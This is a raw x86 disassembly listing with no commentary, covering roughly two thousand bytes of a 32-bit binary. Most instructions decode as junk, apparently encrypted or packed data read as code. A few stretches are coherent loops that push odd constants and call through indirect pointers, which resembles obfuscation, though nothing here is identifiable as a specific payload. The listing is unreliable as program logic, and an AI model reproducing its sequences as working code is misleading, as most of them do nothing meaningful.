  4127e6:	mov    ebp,0x686d4c24
  4127eb:	(bad)  
  4127ec:	std    
  4127ed:	pop    ss
  4127ee:	add    al,0xc2
  4127f0:	mov    ecx,0x810f5910
  4127f5:	mov    ebp,0x363e7e2d
  4127fa:	or     eax,0x36dce280
  4127ff:	mov    bh,0x39
  412801:	rol    DWORD PTR [ebx+ecx*2-0x339a61bc],cl
  412808:	test   eax,0x76c38c27
  41280d:	push   ss
  41280e:	xor    al,0xd7
  412810:	mov    eax,0xfdb705be
  412815:	into   
  412816:	mov    ebx,0x3dc27600
  41281b:	mov    WORD PTR [ebp+0x23],ss
  41281e:	add    DWORD PTR [ecx-0x21477663],0x7
  412825:	mov    bh,0x3c
  412827:	les    edx,FWORD PTR [ebp+0xcaafc1]
  41282d:	or     al,al
  41282f:	pop    ds
  412830:	psrlq  mm1,QWORD PTR [ebx]
  412833:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412834:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412835:	push   edi
  412836:	lock jbe 0x41287f
  412839:	mov    ds:0x9536114f,eax
  41283e:	mov    edx,DWORD PTR [eax-0x37]
  412841:	mov    ebp,0xfafed9e7
  412846:	sub    DWORD PTR [edi+0x79],ebp
  412849:	mov    esi,0xcd3d5b86
  41284e:	mov    eax,0x8640cc3e
  412853:	jle    0x4128bb
  412855:	sbb    al,0x8e
  412857:	push   esp
  412858:	pop    ss
  412859:	sahf   
  41285a:	inc    esi
  41285b:	pop    ds
  41285c:	sub    BYTE PTR [ebx-0x6d99958],0x1b
  412863:	add    ecx,DWORD PTR [ebp+ebp*4+0x17]
  412867:	xchg   esi,eax
  412868:	jl     0x412877
  41286a:	fnstsw WORD PTR [ebx+0x3]
  41286d:	icebp  
  41286e:	jno    0x41280f
  412870:	inc    edi
  412871:	loopne 0x41281a
  412873:	dec    eax
  412874:	push   0xffffffe1
  412876:	pop    eax
  412877:	popf   
  412878:	add    eax,0xcfb7a763
  41287d:	mov    eax,ds:0x23c8d9f8
  412882:	sbb    esp,esi
  412884:	imul   ebx,DWORD PTR [edi+0x44],0xf624fa95
  41288b:	les    esp,FWORD PTR [ebx-0x5a]
  41288e:	and    al,0x5a
  412890:	cmp    al,0x7f
  412892:	cmp    ebp,DWORD PTR [ecx-0x4e173f07]
  412898:	mov    eax,0xba887abf
  41289d:	fldcw  WORD PTR [edi+eax*1+0x72b0b76c]
  4128a4:	out    dx,eax
  4128a5:	sbb    dh,BYTE PTR [edi+esi*1+0x72]
  4128a9:	ins    DWORD PTR es:[edi],dx
  4128aa:	mov    ebx,0x5c71f1a9
  4128af:	push   0xcee96517
  4128b4:	mov    BYTE PTR [edx-0x1abddb7d],cl
  4128ba:	xchg   ebp,eax
  4128bb:	xor    eax,0xa699b27c
  4128c0:	jbe    0x4128cf
  4128c2:	sub    eax,0xcdabbbd2
  4128c7:	jns    0x412908
  4128c9:	cwde   
  4128ca:	test   eax,0x2d132669
  4128cf:	xchg   esi,eax
  4128d0:	fcom   QWORD PTR [ebp-0x2bc8b358]
  4128d6:	fs int 0x71
  4128d9:	push   eax
  4128da:	jo     0x4128a7
  4128dc:	xor    eax,0x6af1dcfa
  4128e1:	je     0x412881
  4128e3:	in     al,dx
  4128e4:	sub    eax,0x6062f9b2
  4128e9:	adc    BYTE PTR [esi+0x37],bh
  4128ec:	and    al,0xce
  4128ee:	in     al,dx
  4128ef:	push   ebx
  4128f0:	cmp    BYTE PTR [eax],0x1c
  4128f3:	jmp    0xdd3d360
  4128f8:	jecxz  0x4128dc
  4128fa:	add    BYTE PTR [edi],0xb8
  4128fd:	loop   0x412960
  4128ff:	cmc    
  412900:	int    0xec
  412902:	imul   ebx,DWORD PTR [ecx+0x23],0x33389453
  412909:	jle    0x41291d
  41290b:	(bad)  
  41290c:	std    
  41290d:	es test eax,0x8c99fc3f
  412913:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412914:	lds    ebp,FWORD PTR [ebx+0x5a]
  412917:	pusha  
  412918:	test   al,0xe8
  41291a:	movs   BYTE PTR es:[di],BYTE PTR ds:[si]
  41291c:	cli    
  41291d:	aaa    
  41291e:	mov    ch,0x2f
  412920:	retf   
  412921:	inc    ebx
  412922:	sub    cl,BYTE PTR [ecx+0x66]
  412925:	jecxz  0x4128d2
  412927:	aam    0x91
  412929:	adc    ah,BYTE PTR [ecx-0x36]
  41292c:	sti    
  41292d:	fistp  DWORD PTR ds:0x1de8095
  412933:	inc    esp
  412934:	dec    esp
  412935:	sub    eax,0x24339e5
  41293a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41293b:	xchg   edi,eax
  41293c:	sub    eax,0xd408b77b
  412941:	icebp  
  412942:	fiadd  WORD PTR [ebx-0x134d0695]
  412948:	xchg   ah,cl
  41294a:	sub    esp,0x4e
  41294d:	adc    BYTE PTR [ebx],ah
  41294f:	add    cl,BYTE PTR [ecx-0x6996db35]
  412955:	div    bh
  412957:	adc    DWORD PTR [esp+edi*8],ebx
  41295a:	out    dx,eax
  41295b:	adc    cl,BYTE PTR [esi-0x23]
  41295e:	push   edx
  41295f:	(bad)  
  412960:	bound  esp,QWORD PTR [ecx+0x5]
  412963:	sub    BYTE PTR [ecx-0x65],ah
  412966:	hlt    
  412967:	dec    esp
  412968:	jae    0x4128ea
  41296a:	xor    eax,0xeb674ee7
  41296f:	jno    0x4129cd
  412971:	jae    0x4129e6
  412973:	daa    
  412974:	sahf   
  412975:	enter  0x469c,0x2e
  412979:	fadd   QWORD PTR [edi+0xe366e22]
  41297f:	sti    
  412980:	jecxz  0x412938
  412982:	sbb    eax,0xdb21d6d3
  412987:	push   ebp
  412988:	jecxz  0x412977
  41298a:	ret    
  41298b:	je     0x412989
  41298d:	pop    esp
  41298e:	stos   BYTE PTR es:[edi],al
  41298f:	out    0x10,eax
  412991:	popa   
  412992:	in     al,dx
  412993:	pop    ecx
  412994:	ins    BYTE PTR es:[edi],dx
  412995:	dec    edx
  412996:	and    eax,0xbca322fd
  41299b:	jp     0x4129eb
  41299d:	(bad)  
  41299e:	sar    cl,1
  4129a0:	inc    esp
  4129a2:	pop    eax
  4129a3:	imul   esi,DWORD PTR [edi+0x7b],0x5e
  4129a7:	daa    
  4129a8:	scas   al,BYTE PTR es:[edi]
  4129a9:	adc    al,0x69
  4129ab:	shl    DWORD PTR [edx+0x1b],0x80
  4129af:	push   edx
  4129b0:	(bad)  
  4129b1:	sahf   
  4129b2:	sub    ebx,DWORD PTR [edi-0x77]
  4129b5:	sub    BYTE PTR cs:[edi+0x46],al
  4129b9:	ins    DWORD PTR es:[edi],dx
  4129ba:	pop    ebp
  4129bb:	push   ss
  4129bc:	adc    al,0xc1
  4129be:	out    0x92,al
  4129c0:	cmc    
  4129c1:	add    cl,cl
  4129c3:	mov    cl,0xea
  4129c5:	push   ebp
  4129c6:	das    
  4129c7:	adc    ebx,DWORD PTR [eax]
  4129c9:	mov    ebx,0x27ce1a7d
  4129ce:	jb     0x4129bb
  4129d0:	inc    edi
  4129d1:	es mov esp,0xfd5e8593
  4129d7:	dec    ebx
  4129d8:	pop    edx
  4129d9:	jmp    0x4129f2
  4129db:	xchg   esi,eax
  4129dc:	sub    al,0xc0
  4129de:	xchg   esp,eax
  4129df:	cdq    
  4129e0:	add    al,0x9a
  4129e2:	sbb    al,0x6d
  4129e4:	cdq    
  4129e5:	mov    ch,BYTE PTR [ecx-0x6168ba13]
  4129eb:	popa   
  4129ec:	in     eax,0xab
  4129ee:	cmp    DWORD PTR [eax-0x39],esi
  4129f1:	jmp    0x47de00fc
  4129f6:	inc    esi
  4129f7:	das    
  4129f8:	outs   dx,BYTE PTR ds:[esi]
  4129f9:	cmp    eax,0xd40b94d
  4129fe:	jnp    0x4129ea
  412a00:	mov    ds:0xd14dc12d,al
  412a05:	fidiv  DWORD PTR [ecx]
  412a07:	pop    eax
  412a08:	xchg   ecx,eax
  412a09:	add    eax,0x52856a68
  412a0e:	(bad)  [edx+0x488da53c]
  412a14:	xor    edx,DWORD PTR es:[ebp-0x46b1b625]
  412a1b:	pop    edi
  412a1c:	pop    ecx
  412a1d:	mov    eax,ds:0x7396cc2c
  412a22:	jmp    0x4d3e39d3
  412a27:	std    
  412a28:	xor    DWORD PTR [edx-0x70],0xffffffab
  412a2c:	jmp    0x555265c8
  412a31:	sbb    DWORD PTR ds:0xb8f89877,edi
  412a37:	pop    ebx
  412a38:	stos   BYTE PTR es:[edi],al
  412a39:	test   eax,0x2a8b0fe
  412a3e:	sub    ebp,ebx
  412a40:	jmp    0x412a4f
  412a42:	jb     0x412a89
  412a44:	push   esi
  412a45:	shl    DWORD PTR [ebp+0x761f830d],0xc8
  412a4c:	xchg   esp,eax
  412a4d:	or     DWORD PTR [eax+0x40],ebx
  412a50:	cmp    al,0xf1
  412a52:	mov    BYTE PTR [eax-0x79],dh
  412a55:	dec    edi
  412a56:	sbb    DWORD PTR ds:0x1ee8efd6,eax
  412a5c:	push   0xa4f7a833
  412a61:	(bad)  
  412a62:	retf   0x5dad
  412a65:	pop    ebp
  412a66:	dec    edx
  412a67:	jo     0x412ace
  412a69:	retf   0x1388
  412a6c:	mov    ds:0x7cf3831d,eax
  412a71:	xchg   ecx,eax
  412a72:	inc    ebp
  412a73:	push   es
  412a74:	pop    ds
  412a75:	push   cs
  412a76:	push   es
  412a77:	xor    ebx,DWORD PTR [esi]
  412a79:	lahf   
  412a7a:	xchg   edx,ebx
  412a7c:	enter  0x81e6,0xda
  412a80:	pop    esp
  412a81:	sub    BYTE PTR [esi+0x42],dh
  412a84:	pop    esi
  412a85:	rcr    BYTE PTR [edx-0x3],1
  412a88:	push   edx
  412a89:	mov    dh,0xb9
  412a8b:	pop    ebp
  412a8c:	sub    ecx,DWORD PTR [eax]
  412a8e:	pop    esi
  412a8f:	jns    0x412aa0
  412a91:	test   BYTE PTR [eax],dl
  412a93:	add    BYTE PTR [eax],al
  412a95:	add    BYTE PTR [ebx+0x3d03144d],cl
  412a9b:	and    dl,ah
  412a9d:	inc    edx
  412a9e:	add    BYTE PTR [ebx-0x7609f4f7],cl
  412aa4:	dec    ebp
  412aa5:	in     al,0xc7
  412aa7:	add    eax,0x42fdf5
  412aac:	pop    ss
  412aad:	add    BYTE PTR [eax],al
  412aaf:	add    BYTE PTR [ebx+0x42fdf53d],al
  412ab5:	add    BYTE PTR [eax],al
  412ab7:	je     0x412b09
  412abd:	cmp    DWORD PTR ds:0x42fdf5,0x24
  412ac4:	jne    0x412af1
  412aca:	push   0x5fda
  412acf:	push   0x42de
  412ad4:	push   0x6b28
  412ad9:	push   0x4e0a
  412ade:	push   DWORD PTR [ebp-0x10]
  412ae1:	push   0x8dcd
  412ae6:	push   0x86d4
  412aeb:	call   DWORD PTR ds:0x42e417
  412af1:	mov    edi,DWORD PTR ds:0x42fdf5
  412af7:	dec    edi
  412af8:	mov    DWORD PTR ds:0x42fdf5,edi
  412afe:	jmp    0x412ab0
  412b03:	and    ecx,DWORD PTR ds:0x42e228
  412b09:	imul   edx,eax
  412b0c:	mov    ecx,0x4573
  412b11:	add    DWORD PTR ds:0x42e218,edx
  412b17:	add    edx,ecx
  412b19:	mov    esi,0x7879
  412b1e:	sub    edi,0x22a0
  412b24:	mov    edi,0x1556
  412b29:	jmp    0x412e0d
  412b2e:	retf   
  412b2f:	sbb    eax,eax
  412b31:	inc    esp
  412b32:	loopne 0x412ba7
  412b34:	push   ebx
  412b35:	mov    bl,0x1a
  412b37:	ror    BYTE PTR [edi],cl
  412b39:	ja     0x412b04
  412b3b:	pop    ds
  412b3c:	in     al,0xd7
  412b3e:	adc    DWORD PTR [esi+0x70],esp
  412b41:	jo     0x412afc
  412b43:	jle    0x412bb5
  412b45:	jo     0x412bac
  412b47:	push   ds
  412b48:	xchg   esp,eax
  412b49:	ss in  eax,dx
  412b4b:	xchg   ebx,eax
  412b4c:	cmp    DWORD PTR [ecx-0x14],esp
  412b4f:	aad    0xf7
  412b51:	pusha  
  412b52:	pop    esi
  412b53:	fiadd  WORD PTR [ebp+0x3e]
  412b56:	lods   eax,DWORD PTR ds:[esi]
  412b57:	inc    esi
  412b58:	xchg   ebp,eax
  412b59:	cmc    
  412b5a:	jp     0x412b74
  412b5c:	mov    ah,0x15
  412b5e:	(bad)  
  412b60:	into   
  412b61:	addr16 loope 0x412aff
  412b64:	fidiv  WORD PTR [eax]
  412b66:	inc    ebp
  412b67:	and    al,0x2
  412b69:	fld    DWORD PTR [edi+0x328ceb7a]
  412b6f:	mov    DWORD PTR [eax+0x2515e961],esp
  412b75:	inc    ebp
  412b76:	add    eax,0x67c89a48
  412b7b:	in     eax,0x83
  412b7d:	add    bl,0xd
  412b80:	pop    esp
  412b81:	pop    ecx
  412b82:	jg     0x412bd7
  412b84:	jp     0x412bef
  412b86:	xlat   BYTE PTR ds:[ebx]
  412b87:	sbb    al,0xc6
  412b89:	out    dx,eax
  412b8a:	and    al,0xc2
  412b8c:	shl    DWORD PTR [eax],0x45
  412b8f:	push   0xed447132
  412b94:	and    eax,0xc28e9a77
  412b99:	mov    bh,0xb7
  412b9b:	add    DWORD PTR fs:[eax],esp
  412b9e:	popf   
  412b9f:	jmp    0x412c1c
  412ba1:	(bad)  
  412ba2:	retf   0xe436
  412ba5:	push   eax
  412ba6:	add    bl,cl
  412ba8:	call   0xc1ba5966
  412bad:	xchg   esp,eax
  412bae:	and    eax,0x75dccc5b
  412bb3:	jo     0x412be9
  412bb5:	dec    ebx
  412bb6:	dec    esi
  412bb7:	rcr    BYTE PTR [edi+0x5],cl
  412bba:	das    
  412bbb:	into   
  412bbc:	push   ecx
  412bbd:	aad    0xba
  412bbf:	repnz std 
  412bc1:	ret    0x5c7b
  412bc4:	push   esi
  412bc5:	adc    eax,DWORD PTR ds:0x1cee7564
  412bcb:	das    
  412bcc:	add    BYTE PTR [ebp-0x55cb4cef],ch
  412bd2:	push   esp
  412bd3:	sub    DWORD PTR [ebx+0x23],esp
  412bd6:	cmp    eax,0x5c98e959
  412bdb:	pop    eax
  412bdc:	mov    bl,0xb3
  412bde:	jo     0x412b62
  412be0:	fdiv   DWORD PTR [esi-0x2b]
  412be3:	adc    cl,BYTE PTR [edx+eax*2+0x11842788]
  412bea:	(bad)  [edx+0x79]
  412bed:	mov    dl,0xde
  412bef:	and    al,0xf
  412bf1:	lds    ecx,FWORD PTR [edx]
  412bf3:	mov    eax,ds:0x93c1e304
  412bf8:	and    edi,DWORD PTR [esi+0x7ea61af0]
  412bfe:	dec    eax
  412bff:	pop    ss
  412c00:	mov    bl,0x15
  412c02:	push   ebx
  412c03:	adc    bl,cl
  412c05:	pusha  
  412c06:	pop    eax
  412c07:	(bad)  
  412c08:	fucom  st(4)
  412c0a:	xor    ah,ch
  412c0c:	gs sub al,0xe1
  412c0f:	int    0x12
  412c11:	daa    
  412c12:	fnsave [eax+0x43973644]
  412c18:	in     al,0xe3
  412c1a:	cmp    eax,0x99081766
  412c1f:	fisttp QWORD PTR [edx-0x3651e12d]
  412c25:	cmp    eax,0x74e9d757
  412c2a:	pop    eax
  412c2b:	dec    esi
  412c2c:	loop   0x412c99
  412c2e:	lock (bad) 
  412c30:	and    edx,DWORD PTR fs:[ebp-0x1084f66a]
  412c37:	cmp    esi,edx
  412c39:	dec    ebx
  412c3a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412c3b:	add    DWORD PTR [ebp-0x980d9],ecx
  412c41:	sub    eax,0x1701e583
  412c46:	scas   al,BYTE PTR es:[edi]
  412c47:	and    dh,ah
  412c49:	push   ds
  412c4a:	lds    ebx,FWORD PTR [ebx]
  412c4c:	xchg   ecx,eax
  412c4d:	test   DWORD PTR [edi],0x37422a5b
  412c53:	mov    ds:0x47ed4b96,eax
  412c58:	shl    DWORD PTR [ebp-0x1eabf21e],cl
  412c5e:	data16 cmp al,0x7e
  412c61:	cmp    al,0xb1
  412c63:	ja     0x412c72
  412c65:	xchg   BYTE PTR [edx-0x20],bl
  412c68:	or     BYTE PTR [ebx-0x3],ah
  412c6b:	inc    esp
  412c6c:	aaa    
  412c6d:	test   bl,0x94
  412c70:	sbb    DWORD PTR [edx+0x2f],edx
  412c73:	bound  eax,QWORD PTR [edi+edx*8+0x3e768ae7]
  412c7a:	mov    ah,0x58
  412c7c:	popf   
  412c7d:	hlt    
  412c7e:	or     BYTE PTR [eax-0x6d],0xe4
  412c82:	or     eax,0x8763dcef
  412c87:	and    dh,BYTE PTR [edi]
  412c89:	outs   dx,DWORD PTR ds:[esi]
  412c8a:	ret    
  412c8b:	sub    ebx,DWORD PTR [ebx+0x7793f265]
  412c91:	dec    ebx
  412c92:	out    0x9d,eax
  412c94:	ss (bad) 
  412c96:	jg     0x412c33
  412c98:	sbb    ebx,0xdff82bf8
  412c9e:	imul   eax,DWORD PTR [ebx],0x5c9d3ddc
  412ca4:	cmc    
  412ca5:	retf   
  412ca6:	cmp    ah,bl
  412ca8:	ret    
  412ca9:	cli    
  412caa:	push   esp
  412cab:	lahf   
  412cac:	inc    ecx
  412cad:	outs   dx,BYTE PTR ds:[esi]
  412cae:	leave  
  412caf:	dec    edx
  412cb0:	clc    
  412cb1:	shl    DWORD PTR [edx],cl
  412cb3:	in     al,dx
  412cb4:	inc    esi
  412cb5:	or     DWORD PTR [esi],eax
  412cb7:	jmp    0x8bec:0x80301818
  412cbe:	dec    edi
  412cbf:	xchg   edi,eax
  412cc0:	xor    al,0xff
  412cc2:	call   0x8561:0x3bdb764d
  412cc9:	jne    0x412c5d
  412ccb:	lahf   
  412ccc:	xor    BYTE PTR [esi],ah
  412cce:	ret    
  412ccf:	into   
  412cd0:	int3   
  412cd1:	jl     0x412d2e
  412cd3:	fwait
  412cd4:	pop    esp
  412cd5:	fmul   DWORD PTR [ebp-0x13f63cae]
  412cdb:	push   esp
  412cdc:	push   eax
  412cdd:	in     al,0x7e
  412cdf:	jle    0x412d1c
  412ce1:	inc    ebp
  412ce2:	test   BYTE PTR [edi+edx*8],0x84
  412ce6:	mov    ebp,?
  412ce8:	out    0x49,al
  412cea:	or     al,0x6
  412cec:	xchg   edx,eax
  412ced:	xor    DWORD PTR [edi+0xb881e17],0x72
  412cf4:	dec    edx
  412cf5:	es cmp eax,0xc4035341
  412cfb:	cmp    ebx,edx
  412cfd:	popf   
  412cfe:	ins    DWORD PTR es:[edi],dx
  412cff:	pop    ebx
  412d00:	mov    ecx,0xf3f1cd74
  412d05:	cdq    
  412d06:	jp     0x412d69
  412d08:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412d09:	ret    0xcfc
  412d0c:	(bad)  
  412d0d:	enter  0x3b63,0xa2
  412d11:	call   0xeb2343c6
  412d16:	bound  edi,QWORD PTR [ebx]
  412d18:	dec    esi
  412d19:	jmp    0x412d16
  412d1b:	mov    edx,ebx
  412d1d:	(bad)  
  412d1f:	pop    ebp
  412d20:	and    dl,BYTE PTR [ebx+0x2218ab29]
  412d26:	mov    esp,0xfa81c27c
  412d2b:	mov    bl,0x1a
  412d2d:	adc    ebx,DWORD PTR [ecx-0x33ec3cbb]
  412d33:	jecxz  0x412cda
  412d35:	sti    
  412d36:	jae    0x412d6e
  412d38:	dec    esp
  412d39:	or     ebx,DWORD PTR [esi+0x7cc6ec85]
  412d3f:	lock retf 
  412d41:	mov    BYTE PTR [edi+eax*2-0x2bb9f37d],ah
  412d48:	test   BYTE PTR [ebp+edx*8-0x7f270fbe],dh
  412d4f:	xchg   ecx,eax
  412d50:	ror    DWORD PTR [ecx+ecx*1],0x6e
  412d54:	jmp    0x412d19
  412d56:	dec    edi
  412d57:	jmp    0xcac6:0x5e57a20d
  412d5e:	cld    
  412d5f:	(bad)  
  412d60:	in     al,dx
  412d61:	jge    0x412d4a
  412d63:	out    dx,al
  412d64:	xchg   DWORD PTR [ecx+esi*8+0x41e365a0],esp
  412d6b:	cmp    al,0xcf
  412d6d:	test   al,0xc0
  412d6f:	clc    
  412d70:	inc    ecx
  412d71:	push   ebp
  412d72:	mov    ecx,0xa5e9562
  412d77:	fucomi st,st(5)
  412d79:	shl    DWORD PTR [ebp+0x6a],0xa6
  412d7d:	adc    ebp,DWORD PTR [eax+0xa]
  412d80:	cs pop eax
  412d82:	aaa    
  412d83:	cmc    
  412d84:	lds    ecx,FWORD PTR [ebx+0xd]
  412d87:	pop    edi
  412d88:	sub    DWORD PTR [ebx-0x32432ba6],edx
  412d8e:	jne    0x412d92
  412d90:	inc    ecx
  412d91:	(bad)  
  412d92:	fiadd  WORD PTR [eax-0x28]
  412d95:	mov    bh,0x93
  412d97:	data16 (bad) 
  412d99:	and    esp,eax
  412d9b:	and    dl,dh
  412d9d:	xor    BYTE PTR [edi],bl
  412d9f:	or     BYTE PTR ds:0xcecde34d,bl
  412da5:	mov    ds:0xe430b5f2,al
  412daa:	push   esp
  412dab:	fcomp  QWORD PTR [ebp+0x1f220311]
  412db1:	xor    DWORD PTR [edx-0x33],eax
  412db4:	loope  0x412e27
  412db6:	xlat   BYTE PTR ds:[ebx]
  412db7:	aas    
  412db8:	dec    edx
  412db9:	(bad)  
  412dbb:	xchg   edi,eax
  412dbc:	mov    bl,0xe
  412dbe:	ror    cl,1
  412dc0:	push   ds
  412dc1:	pop    edx
  412dc2:	adc    eax,0x6b2695ca
  412dc7:	mov    edx,0x5467eb21
  412dcc:	pop    eax
  412dcd:	fsub   DWORD PTR [ebp-0x15]
  412dd0:	sub    al,0x88
  412dd2:	imul   BYTE PTR [esi]
  412dd4:	sbb    DWORD PTR [edi-0x10],edi
  412dd7:	lock fs ins DWORD PTR es:[edi],dx
  412dda:	add    cl,BYTE PTR [ebx+0x6cc26aa0]
  412de0:	lods   al,BYTE PTR cs:[esi]
  412de2:	repz (bad)
  412de6:	sahf   
  412de7:	jecxz  0x412e2d
  412de9:	mov    edi,0x2421cda9
  412dee:	call   FWORD PTR ds:0xea494eac
  412df4:	dec    ebp
  412df5:	cmp    cl,BYTE PTR [ebx-0x73dae7c0]
  412dfb:	cwde   
  412dfc:	push   eax
  412dfd:	inc    ecx
  412dfe:	outs   dx,DWORD PTR ds:[esi]
  412dff:	jg     0x412e34
  412e01:	cmp    eax,0xfc1e1d13
  412e06:	lods   eax,DWORD PTR ds:[esi]
  412e07:	push   esi
  412e08:	xchg   DWORD PTR [ebx-0x78bb64f3],ebx
  412e0e:	into   
  412e0f:	and    DWORD PTR ds:0x42e21c,0x0
  412e19:	jmp    0x412e2d
  412e1e:	xor    ecx,ecx
  412e20:	add    ecx,DWORD PTR ds:0x42e21c
  412e26:	inc    ecx
  412e27:	mov    DWORD PTR ds:0x42e21c,ecx
  412e2d:	cmp    DWORD PTR ds:0x42e21c,0x17
  412e34:	jae    0x412e60
  412e3a:	cmp    DWORD PTR ds:0x42e21c,0x25
  412e41:	jne    0x412e55
  412e47:	push   0x286f
  412e4c:	push   DWORD PTR [ebp-0x18]
  412e4f:	call   DWORD PTR ds:0x42e587
  412e55:	jmp    0x412e1e
  412e5a:	xor    ecx,0x7ba7
  412e60:	sub    edx,edi
  412e62:	xor    esi,esi
  412e64:	jmp    0x413148
  412e69:	call   0x6aab08c6
  412e6e:	jno    0x412ee7
  412e70:	popa   
  412e71:	push   ebx
  412e72:	xchg   eax,esp
  412e74:	arpl   WORD PTR [ecx+0x65],dx
  412e77:	bound  ebx,QWORD PTR cs:[edx+0x64]
  412e7b:	jo     0x412eed
  412e7d:	mov    ecx,0x5870707e
  412e82:	sar    BYTE PTR ds:0x6d457449,cl
  412e88:	sub    BYTE PTR [esi-0x37b2c20f],bl
  412e8e:	arpl   WORD PTR [eax-0x522191be],di
  412e94:	(bad)  
  412e95:	loopne 0x412e8b
  412e97:	fwait
  412e98:	outs   dx,BYTE PTR ds:[esi]
  412e99:	outs   dx,DWORD PTR ds:[esi]
  412e9a:	ins    BYTE PTR es:[edi],dx
  412e9b:	push   ebx
  412e9c:	xor    bh,BYTE PTR [eax+0xc]
  412e9f:	and    BYTE PTR [ecx-0x692b3576],cl
  412ea5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412ea6:	xchg   ebx,eax
  412ea7:	ss xchg ebx,eax
  412ea9:	add    bh,BYTE PTR [ebp-0xd6a4042]
  412eaf:	ss loop 0x412e8d
  412eb2:	pop    esi
  412eb3:	arpl   dx,bp
  412eb5:	jb     0x412f0d
  412eb7:	fld    DWORD PTR [edx+ebx*4+0x67]
  412ebb:	mov    eax,0x783b41f2
  412ec0:	inc    esi
  412ec1:	fwait
  412ec2:	push   ecx
  412ec3:	sbb    ebx,DWORD PTR [eax+eiz*2-0x37a450f0]
  412eca:	cmp    al,dh
  412ecc:	enter  0x69f2,0x4a
  412ed0:	in     eax,0xad
  412ed2:	sub    edx,ebx
  412ed4:	and    al,0x6a
  412ed6:	cmp    eax,0x4210bfd0
  412edb:	jge    0x412efd
  412edd:	lahf   
  412ede:	stc    
  412edf:	cmp    dh,ah
  412ee1:	xor    DWORD PTR [edx+esi*1],0xffffffb1
  412ee5:	jno    0x412ea7
  412ee7:	out    dx,al
  412ee8:	(bad)  
  412ee9:	das    
  412eea:	cdq    
  412eeb:	call   0xbc6811c1
  412ef0:	dec    edi
  412ef1:	add    eax,0x82aee175
  412ef6:	std    
  412ef7:	pushf  
  412ef8:	mov    ebp,0x1837e636
  412efd:	sbb    esi,0xfc5641b7
  412f03:	sar    edx,1
  412f05:	push   edx
  412f06:	inc    ecx
  412f07:	jnp    0x412ebf
  412f09:	sahf   
  412f0a:	mov    ebx,DWORD PTR [ebp-0x6240b746]
  412f10:	ins    BYTE PTR es:[edi],dx
  412f11:	or     al,0x90
  412f13:	mov    dh,0x3
  412f15:	cmc    
  412f16:	std    
  412f17:	jl     0x412e9f
  412f19:	add    al,0xc9
  412f1b:	test   DWORD PTR [edx+0x6b38a4a4],ebp
  412f21:	adc    eax,0x77190038
  412f26:	test   eax,0x4856456a
  412f2b:	xchg   edi,eax
  412f2c:	retf   0xe2a6
  412f2f:	mov    al,ds:0x8376d809
  412f34:	pop    ebx
  412f35:	imul   edi,DWORD PTR [ecx+edx*8-0x41],0x5e96dad
  412f3d:	inc    ebx
  412f3e:	mov    ebx,DWORD PTR [eax-0x5]
  412f41:	and    al,0xa2
  412f43:	mov    ecx,0x6d7a591f
  412f48:	ds dec ebx
  412f4a:	pop    esi
  412f4b:	test   eax,0x1af78d15
  412f50:	lock sub BYTE PTR [ebx+esi*2+0x42],bh
  412f55:	pop    edx
  412f56:	add    al,0x34
  412f58:	fldcw  WORD PTR [ecx]
  412f5a:	mov    ds:0x5789e52e,eax
  412f5f:	inc    ecx
  412f60:	xchg   edx,eax
  412f61:	xor    esp,DWORD PTR [edx]
  412f63:	mov    edx,0x7d4cdae
  412f68:	push   edx
  412f69:	push   ebp
  412f6a:	rcl    eax,1
  412f6c:	cmp    DWORD PTR ds:0x3cffb1db,0xf2b1b472
  412f76:	test   DWORD PTR [ebx+0x3c],edi
  412f79:	mov    eax,DWORD PTR [esi+0x62d53d0a]
  412f7f:	movs   DWORD PTR es:[edi],DWORD PTR cs:[esi]
  412f81:	xchg   edi,eax
  412f82:	mov    al,0xc8
  412f84:	push   ss
  412f85:	cmp    ebx,eax
  412f87:	fidivr DWORD PTR [ecx-0x24]
  412f8a:	sbb    al,0xe1
  412f8c:	xchg   DWORD PTR [ebp+0x53403af],edi
  412f92:	dec    eax
  412f93:	(bad)  
  412f94:	mov    cl,0x2d
  412f96:	sbb    al,0x86
  412f98:	xor    eax,0x5bd40a8b
  412f9d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412f9e:	jae    0x412f5f
  412fa0:	test   al,0x7a
  412fa2:	fst    QWORD PTR [edx+0x6e]
  412fa5:	shr    DWORD PTR [ecx+0x3],1
  412fa8:	xor    BYTE PTR [edi+0x68],0x46
  412fac:	ins    BYTE PTR es:[edi],dx
  412fad:	retf   0x5a5
  412fb0:	shl    BYTE PTR [eax],0xfc
  412fb3:	mov    BYTE PTR [ebp-0x36],cl
  412fb6:	jmp    0x24cca454
  412fbb:	push   edi
  412fbc:	js     0x412f8f
  412fbe:	dec    esi
  412fbf:	jbe    0x412f58
  412fc1:	call   0xda44:0x5361fc57
  412fc8:	and    esp,DWORD PTR [esi+0x409576ec]
  412fce:	jo     0x412fc6
  412fd0:	out    0xe1,eax
  412fd2:	push   eax
  412fd3:	jmp    FWORD PTR [eax+0x68]
  412fd6:	xchg   DWORD PTR [ebx+0x17],esi
  412fd9:	sub    BYTE PTR [ebx-0x23],dl
  412fdc:	mov    gs,WORD PTR [ebp-0x68]
  412fdf:	mov    eax,ds:0x2901acf8
  412fe4:	nop
  412fe5:	adc    ecx,DWORD PTR [eax+0x55a6940c]
  412feb:	mov    ah,0x14
  412fed:	dec    ebx
  412fee:	or     esp,DWORD PTR [edx]
  412ff0:	fisub  DWORD PTR [edx]
  412ff2:	test   al,0x25
  412ff4:	adc    BYTE PTR [ebp+0x643d4467],bl
  412ffa:	inc    edx
  412ffb:	xor    esi,DWORD PTR [esi-0x35]
  412ffe:	scas   al,BYTE PTR es:[edi]
  412fff:	mov    ch,al
  413001:	adc    DWORD PTR [edx+edi*1-0x2d9188e7],ebp
  413008:	inc    ecx
  413009:	sbb    al,0x67
  41300b:	mov    esi,0x583f2bb7
  413010:	hlt    
  413011:	movs   WORD PTR es:[edi],WORD PTR ds:[esi]
  413013:	ja     0x413065
  413015:	mov    esi,DWORD PTR [ebp-0x2f]
  413018:	lods   al,BYTE PTR ds:[esi]
  413019:	fdiv   QWORD PTR [ecx+edx*1+0x64]
  41301d:	call   0x72a0:0x8fd5184f
  413024:	test   al,0xb9
  413026:	(bad)  
  413027:	test   eax,0xeeff0346
